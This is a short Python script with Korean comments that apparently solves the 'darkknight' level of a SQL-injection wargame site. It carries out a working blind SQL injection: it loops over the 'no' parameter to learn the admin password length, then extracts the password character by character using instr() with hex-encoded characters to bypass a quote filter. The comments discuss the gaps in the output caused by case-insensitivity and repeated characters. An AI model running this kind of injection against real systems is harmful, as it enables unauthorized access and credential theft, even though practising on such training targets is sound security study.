import requests as req 

url="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"

ck={
	"PHPSESSID":"냠냠"
}

for i in range(30):
	i+=1
	params={
		"pw":"1",
		"no":f"0 || id like 0x61646d696e and length(pw) like {i}-- "
	}
	with req.get(url, params=params, cookies=ck) as res:
		if "Hello admin" in res.text:
			print("admin pw length :", i)

# admin pw length = 8

for i in range(1, 9):
	print(f"{i}.. : ", end="")
	for j in range(33, 127):
		params={
			"pw":"0",
			"no":f"0||id like 0x61646d696e and instr(pw,{hex(j)}) like {i}-- "
		}
		# instr(pw,chr(j))라고 하면 쿼리문에 싱글 쿼터가 들어가기 때문에 안된다.
		with req.get(url, params=params, cookies=ck) as res:
			if "Hello admin" in res.text:
				print(chr(j))
				break

# instr()함수는 문자열에 같은 문자가 2개 이상 일 때 제일 앞 문자의 인덱스만 반환한다.
# 코드를 실행시키면 0B7 EA1F가 출력된다.(4번째 값이 빔)
# 게다가 instr() 함수는 대문자 소문자 구분도 하지 않아서 출력된 값을 소문자로 고쳐쓰고
# 빈 4번째 자리에 0b7ea1f 중 하나를 써넣어야 문제가 풀린다.

# 겹치는 문자와 대소문자를 어떻게 추출할 수 있을까...
